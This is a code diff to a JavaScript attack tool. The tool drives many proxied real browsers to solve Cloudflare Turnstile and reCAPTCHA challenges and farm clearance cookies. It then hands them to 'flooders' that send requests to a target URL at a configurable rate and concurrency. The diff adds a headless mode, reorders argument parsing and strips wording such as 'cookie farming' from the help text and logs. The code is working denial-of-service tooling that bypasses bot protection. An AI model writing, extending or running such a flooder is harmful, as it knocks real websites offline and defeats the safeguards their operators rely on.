@@ -1,10 +1,4 @@
 import * as puppeteer from "puppeteer-real-browser";
-import fs from "fs";
-import path from "path";
-import { fileURLToPath } from "url";
-import { exec } from "child_process";
-import { promisify } from "util";
-import { createRequire } from "module";
 
 import { Flooder } from "./Flooder.js";
 import {
@@ -13,6 +7,7 @@ import {
   getTimeZoneByIp,
   randnum,
   readFile,
+  getChromePath,
 } from "../util/Helpers.js";
 import { BrowserObject } from "../obj/BrowserObject.js";
 import { solveCloudflare } from "./Cloudflare.js";
@@ -21,14 +16,17 @@ import { solveRecaptcha } from "./Recaptcha.js";
 import { log, detectChallenges } from "../util/Util.js";
 import { autoBypass } from "./Autobypass/Unknown.js";
 
-const require = createRequire(import.meta.url);
-
-const execPromise = promisify(exec);
 const BROWSER_CONFIG = {
   targetUrl:
     process.argv.find((arg) => arg.startsWith("-t="))?.split("=")[1] ||
     process.argv.find((arg) => arg.startsWith("--target="))?.split("=")[1] ||
     "https://example.com",
+  headless:
+    process.argv.find((arg) => arg.startsWith("-hl="))?.split("=")[1] ===
+      "true" ||
+    process.argv.find((arg) => arg.startsWith("--headless="))?.split("=")[1] ===
+      "true" ||
+    false,
   targetPort:
     parseInt(
       process.argv.find((arg) => arg.startsWith("-port="))?.split("=")[1]
@@ -53,10 +51,10 @@ const BROWSER_CONFIG = {
      * * Used in Captcha.js to set max concurrent workers for the Flooder running per browser
      */
     parseInt(
-      process.argv.find((arg) => arg.startsWith("-rps="))?.split("=")[1]
+      process.argv.find((arg) => arg.startsWith("--requests="))?.split("=")[1]
     ) ||
     parseInt(
-      process.argv.find((arg) => arg.startsWith("--requests="))?.split("=")[1]
+      process.argv.find((arg) => arg.startsWith("-rps="))?.split("=")[1]
     ) ||
     1,
   cpspp:
@@ -64,12 +62,12 @@ const BROWSER_CONFIG = {
      * ! Used in Flooder.js to set max concurrent proxy connections per thread
      */
     parseInt(
-      process.argv.find((arg) => arg.startsWith("-cpspp="))?.split("=")[1]
-    ) ||
-    parseInt(
       process.argv
         .find((arg) => arg.startsWith("--cps-per-proxy="))
         ?.split("=")[1]
+    ) ||
+    parseInt(
+      process.argv.find((arg) => arg.startsWith("-cpspp="))?.split("=")[1]
     ) ||
     10,
   runtime:
@@ -90,8 +88,8 @@ const BROWSER_CONFIG = {
       ?.split("=")[1] ||
     process.argv.find((arg) => arg.startsWith("-cookie="))?.split("=")[1],
   userAgents:
-    process.argv.find((arg) => arg.startsWith("-uas="))?.split("=")[1] ||
     process.argv.find((arg) => arg.startsWith("--uas-file="))?.split("=")[1] ||
+    process.argv.find((arg) => arg.startsWith("-uas="))?.split("=")[1] ||
     "../files/uas.txt",
   cookiesFile:
     process.argv
@@ -114,11 +112,11 @@ const BROWSER_CONFIG = {
     process.argv.find((arg) => arg.startsWith("-cfc-file="))?.split("=")[1] ||
     "../files/cf_clearance.txt",
   proxyFile:
-    process.argv.find((arg) => arg.startsWith("-p="))?.split("=")[1] ||
     process.argv
       .find((arg) => arg.startsWith("--proxy-file="))
       ?.split("=")[1] ||
-    "proxies.txt",
+    process.argv.find((arg) => arg.startsWith("-p="))?.split("=")[1] ||
+    "../files/proxies.txt",
 };
 
 const args = process.argv.slice(2);
@@ -133,6 +131,11 @@ for (let i = 0; i < args.length; i++) {
     case "--targetPort":
     case "-port":
       BROWSER_CONFIG.targetPort = args[i + 1];
+      i++;
+      break;
+    case "--headless":
+    case "-hl":
+      BROWSER_CONFIG.headless = args[i + 1] === "true";
       i++;
       break;
     case "--browsers":
@@ -202,6 +205,7 @@ Required Options:
 
 Optional Options:
   -b, --browsers <num>     Number of browsers (default: 5)
+  -hl, --headless <true|false>  Run browsers in headless mode (default: false)
   -rps, --requests <num>   Requests per second (default: 1)
   -cpspp, --cps-per-proxy <num>  Max concurrent proxy
                           connections per thread (default: 10)
@@ -220,7 +224,7 @@ Examples:
   node browser.js -t https://example.com -b 10 -dl 120
   node browser.js -t https://example.com -p custom_proxies.txt
 
-Note: This tool automates browsers to collect Cloudflare clearance tokens.
+Note: This tool automates browsers.
             `);
       process.exit(0);
       break;
@@ -313,35 +317,12 @@ function getProxy(proxyArray) {
   }
 }
 
-async function installPackage() {
-  try {
-    await require("puppeteer-real-browser");
-    return true;
-  } catch (e) {
-    log("INFO", "Installing puppeteer-real-browser...");
-
-    try {
-      await execPromise("npm install puppeteer-real-browser");
-      log("SUCCESS", "puppeteer-real-browser installed successfully.");
-      return true;
-    } catch (error) {
-      log("ERROR", "Failed to install puppeteer-real-browser.");
-      log("WARN", "Try manually: npm install puppeteer-real-browser");
-      return false;
-    }
-  }
-}
-
 async function solveTurnstile(targetUrl, browserId, browsers) {
-  const installed = await installPackage();
-  if (!installed) return false;
-
   const proxyIndex = browserId;
 
   let connect;
   try {
-    const puppeteerModule = await require("puppeteer-real-browser");
-    connect = puppeteerModule.connect;
+    connect = puppeteer.connect;
   } catch (error) {
     log(
       "ERROR",
@@ -445,7 +426,7 @@ async function solveTurnstile(targetUrl, browserId, browsers) {
     `Browser ${browserId}: Window: ${windowSize.width}x${windowSize.height}, Locale: ${locale}, Timezone: ${timezone}, Proxy: ${proxies[proxyIndex].host}:${proxies[proxyIndex].port}`
   );
   const connectOptions = {
-    headless: false,
+    headless: BROWSER_CONFIG.headless == true ? "new" : false,
     turnstile: true,
     args: [
       "--no-sandbox",
@@ -468,10 +449,11 @@ async function solveTurnstile(targetUrl, browserId, browsers) {
     },
     customConfig: {
       userAgent: userAgent,
+      executablePath: getChromePath(),
     },
     proxy: {
-      host: proxies[proxyIndex].host,
-      port: proxies[proxyIndex].port,
+      host: proxies[proxyIndex].host || null,
+      port: proxies[proxyIndex].port || null,
       username: proxies[proxyIndex].username || null,
       password: proxies[proxyIndex].password || null,
     },
@@ -544,7 +526,7 @@ async function solveTurnstile(targetUrl, browserId, browsers) {
 }
 
 async function startMultipleBrowsers(targetUrl, browserCount = 10) {
-  log("FARM", `Starting ${browserCount} browsers for cookie farming...`);
+  log("FARM", `Starting ${browserCount} browsers...`);
 
   const browserPromises = [];
   const browsers = [];
@@ -578,7 +560,7 @@ async function startMultipleBrowsers(targetUrl, browserCount = 10) {
 
   log(
     "SUCCESS",
-    `Cookie farming completed! ${successfulBrowsers.length}/${browserCount} browsers successful`
+    `Browsers completed, engaging flooders! ${successfulBrowsers.length}/${browserCount} browsers successful`
   );
 
   if (successfulBrowsers.length > 0) {
